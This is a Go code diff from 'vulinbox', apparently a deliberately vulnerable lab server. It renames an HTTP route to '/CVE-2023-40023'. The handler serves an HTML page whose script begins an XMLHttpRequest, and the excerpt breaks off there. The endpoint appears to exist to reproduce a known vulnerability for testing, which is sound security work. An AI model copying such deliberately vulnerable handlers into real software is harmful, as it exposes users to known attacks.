@@ -3,7 +3,7 @@ package vulinbox
 import "net/http"
 
 func (s *VulinServer) registerMiscRoute() {
-	s.router.HandleFunc("/misc/mo", func(writer http.ResponseWriter, request *http.Request) {
+	s.router.HandleFunc("/CVE-2023-40023", func(writer http.ResponseWriter, request *http.Request) {
 		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
 		writer.Write([]byte(`<script>
   const xhr = new XMLHttpRequest();
